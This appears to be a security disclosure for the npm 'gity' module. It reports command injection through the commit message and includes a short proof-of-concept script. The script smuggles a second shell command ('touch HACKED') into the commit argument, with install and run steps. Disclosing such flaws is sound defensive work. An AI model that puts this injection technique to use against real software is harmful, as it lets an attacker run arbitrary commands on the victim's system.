# :bug: Description

The `gity` module is vulnerable against `RCE` and `arbitrary command injection` due to `user-supplied input` formatted inside a command which is going to be executed without proper sanitizations.

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var Git = require('gity');
 
var git = Git()
  .add('*.js')
  .commit('-m "added js files";touch HACKED;#')
  .run();

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i gity # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
